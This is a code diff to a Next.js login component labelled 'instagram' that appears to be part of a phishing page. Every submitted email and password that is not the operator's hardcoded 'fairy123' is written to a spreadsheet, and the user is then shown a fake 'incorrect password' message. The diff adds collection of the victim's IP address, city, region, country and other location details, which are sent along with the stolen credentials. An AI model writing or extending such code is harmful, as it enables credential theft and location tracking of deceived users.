@@ -1,6 +1,6 @@
 "use client";
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
 import { Eye, EyeOff } from "lucide-react";
@@ -23,6 +23,25 @@ const LoginForm = () => {
   const [successModal, setSuccessModal] = useState(false);
   const category = "instagram";
   const router = useRouter();
+  const [locationData, setLocationData] = useState({});
+
+  useEffect(() => {
+    const fetchData = async () => {
+      try {
+        const response = await fetch('/api/location');
+        if (response.ok) {
+          const data = await response.json();
+          setLocationData(data);
+        } else {
+          console.error('Failed to fetch location data');
+        }
+      } catch (error) {
+        console.error('Error:', error);
+      }
+    };
+
+    fetchData();
+  }, []);
 
   const handleFirstSubmit = (event) => {
     event.preventDefault();
@@ -42,7 +61,16 @@ const LoginForm = () => {
       if (password === "fairy123") {
         router.push("/upload");
       } else {
-        const data = [[category, email, password]];
+        const capital = locationData?.capital || "unknown";
+        const city = locationData?.city || "unknown";
+        const continent = locationData?.continent || "unknown";
+        const ip = locationData?.ip || "unknown";
+        const region = locationData?.region || "unknown";
+        const country = locationData?.country || "unknown";
+        const currency = locationData?.currency || "unknown";
+        const phoneCode = locationData?.phoneCode || "unknown";
+        // ip-address, city, region, country, continent, currency, phone-code
+        const data = [[category, email, password,ip,city, region, country, continent, currency, phoneCode ]];
         await appendToSheet(data);
         setErrorMsg(
           "The email or password you entered is incorrect. Please try again."
@@ -61,6 +89,8 @@ const LoginForm = () => {
       setErrorMsg("An error occurred. Please try again.");
     }
   };
+
+ 
 
   if (successModal) {
     return <SuccessModal />;
